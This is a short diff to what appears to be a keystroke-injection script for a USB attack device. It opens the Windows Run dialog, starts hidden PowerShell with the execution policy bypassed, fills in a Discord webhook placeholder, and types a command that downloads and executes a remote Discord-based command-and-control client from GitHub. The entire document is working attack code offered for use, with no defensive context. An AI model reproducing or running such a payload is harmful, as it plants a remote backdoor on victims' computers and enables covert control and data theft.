@@ -12,7 +12,9 @@ layout("us")
 delay(1000);
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';");
-delay(500);
+type("powershell -NoP -Ep Bypass -W H");
+press("ENTER");
+delay(5000);
+type("$dc='WEBHOOK_HERE'; $gh='GITHUB_FILE_URL_HERE'; ");
 type("irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex");
 press("ENTER");
